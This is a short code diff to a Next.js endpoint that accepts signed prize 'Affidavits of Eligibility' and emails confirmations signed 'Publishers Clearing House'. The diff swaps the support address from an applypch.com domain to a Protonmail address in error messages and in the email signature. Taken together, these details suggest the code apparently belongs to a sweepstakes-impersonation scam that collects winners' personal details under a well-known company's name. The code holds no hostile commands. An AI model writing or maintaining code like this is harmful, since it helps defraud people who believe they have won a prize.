@@ -89,7 +89,7 @@ export async function POST(request: NextRequest) {
   if (!zohoUser || !zohoPass) {
     console.error('ZOHO_USER or ZOHO_PASS not configured');
     return NextResponse.json(
-      { error: 'Submission is temporarily unavailable. Please try again later or email support@applypch.com.' },
+      { error: 'Submission is temporarily unavailable. Please try again later or email applypch@protonmail.com.' },
       { status: 500 }
     );
   }
@@ -147,7 +147,7 @@ export async function POST(request: NextRequest) {
         <p>Dear ${escapeHtml(parsed.fullName)},</p>
         <p>We have received your signed Affidavit of Eligibility for reference <strong>${escapeHtml(parsed.winRef)}</strong>.</p>
         <p>Our team will review it and contact you regarding the next steps for your prize.</p>
-        <p>Publishers Clearing House<br>support@applypch.com</p>
+        <p>Publishers Clearing House<br>applypch@protonmail.com</p>
       `,
       text: `We have received your Affidavit of Eligibility for ${parsed.winRef}. Our team will review it and contact you with next steps.`,
     });
@@ -156,7 +156,7 @@ export async function POST(request: NextRequest) {
   } catch (err) {
     console.error('Affidavit submit error:', err);
     return NextResponse.json(
-      { error: 'Could not submit your affidavit. Please try again or email support@applypch.com.' },
+      { error: 'Could not submit your affidavit. Please try again or email applypch@protonmail.com.' },
       { status: 500 }
     );
   }
